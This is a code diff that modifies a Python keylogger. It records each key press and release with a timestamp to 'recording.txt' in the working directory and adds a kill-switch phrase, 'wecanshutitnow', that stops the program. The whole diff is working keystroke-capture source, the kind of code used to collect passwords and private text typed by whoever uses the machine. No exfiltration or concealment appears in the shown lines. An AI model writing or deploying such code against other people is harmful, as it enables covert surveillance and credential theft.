@@ -3,9 +3,11 @@ from datetime import datetime
 from pathlib import Path
 
 log_file = "recording.txt"
+command = ""
+kill_now = "wecanshutitnow"
 
 def log_it(log_entry):
-    file_path = Path.home() / log_file
+    file_path = Path.cwd() / log_file
 
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
@@ -15,19 +17,41 @@ def log_it(log_entry):
         with file_path.open('a') as file:
             file.write(log_entry)
 
-    print(log_entry)
+    print(log_entry, end="")
+
+def kill_switch_activated():
+    log_entry = f"Kill switch activated at {datetime.now()}\n"
+    log_it(log_entry)
+    exit(0)
 
 def on_press_function(key_pressed):
-    # A key is pressed
-    key = str(key_pressed)
-    log_entry = f"Key pressed: {key} at {datetime.now()}\n"
+    global command
+
+    if hasattr(key_pressed, 'char') and key_pressed.char is not None:
+        char = key_pressed.char
+        command += char
+
+        if len(command) > len(kill_now):
+            command = command[-len(kill_now):]
+
+        if command == kill_now:
+            kill_switch_activated()
+
+        log_entry = f"Key pressed: {char} at {datetime.now()}\n"
+    else:
+        name = str(key_pressed)
+        log_entry = f"Special key pressed: {name} at {datetime.now()}\n"
+
     log_it(log_entry)
-    if key_pressed == 'q':
-        exit(0)
 
 def on_release_function(key_released):
     # A key is pressed
-    log_entry = f"Key released: {str(key_released)} at {datetime.now()}\n"
+    if hasattr(key_released, 'char') and key_released.char is not None:
+        char = key_released.char
+        log_entry = f"Key released: {char} at {datetime.now()}\n"
+    else:
+        name = str(key_released)
+        log_entry = f"Special key released: {name} at {datetime.now()}\n"
     log_it(log_entry)
 
 def start_keylogger():
